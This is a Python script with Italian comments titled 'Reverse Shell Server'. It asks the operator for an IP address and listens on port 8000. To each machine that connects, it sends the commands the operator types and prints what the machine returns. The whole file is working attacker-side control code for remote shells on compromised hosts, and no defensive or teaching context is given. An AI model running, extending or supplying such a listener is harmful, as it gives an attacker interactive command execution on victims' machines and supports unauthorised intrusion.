#!/usr/bin/env python3
"""
Reverse Shell Server - Versione con IP configurabile
"""
import socket
import struct
import threading
def get_server_ip():
    """Richiede all'utente l'IP del server"""
    while True:
        ip = input("Inserisci l'IP del server (0.0.0.0 per tutte le interfacce): ").strip()
        if not ip:
            print("Devi inserire un indirizzo IP valido")
            continue
        if ip == "0.0.0.0":
            return ip
        try:
            # Verifica che l'IP sia valido
            socket.inet_aton(ip)
            return ip
        except socket.error:
            print(f"IP non valido: {ip}. Riprova.")
def reliable_send(sock, data):
    """Invia dati con prefisso di lunghezza"""
    if isinstance(data, str):
        data = data.encode()
    sock.sendall(struct.pack('>I', len(data)))
    sock.sendall(data)
def reliable_recv(sock):
    """Riceve dati con prefisso di lunghezza"""
    raw_len = sock.recv(4)
    if not raw_len:
        return None
    data_len = struct.unpack('>I', raw_len)[0]
    return sock.recv(data_len)
def handle_client(client_socket, addr):
    """Gestisce una singola connessione client"""
    try:
        print(f"\n[+] Connessione accettata da {addr[0]}:{addr[1]}")
        while True:
            command = input(f"\n{addr[0]}$ ").strip()
            if not command:
                continue
            reliable_send(client_socket, command)
            if command.lower() == 'exit':
                break
            output = reliable_recv(client_socket)
            if output:
                print(output.decode('utf-8', 'ignore'))
    except Exception as e:
        print(f"[!] Errore: {e}")
    finally:
        client_socket.close()
        print(f"[!] Connessione chiusa con {addr[0]}")
def start_server(server_ip):
    """Avvia il server in ascolto"""
    server_port = 8000
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((server_ip, server_port))
    server.listen(5)
    print(f"\n[*] Server in ascolto su {server_ip}:{server_port}")
    print("[*] Premi Ctrl+C per uscire\n")
    try:
        while True:
            client_socket, addr = server.accept()
            client_thread = threading.Thread(
                target=handle_client,
                args=(client_socket, addr)
            )
            client_thread.daemon = True
            client_thread.start()
    except KeyboardInterrupt:
        print("\n[!] Arresto del server...")
    finally:
        server.close()
if __name__ == "__main__":
    print("=== Reverse Shell Server ===")
    server_ip = get_server_ip()
    start_server(server_ip)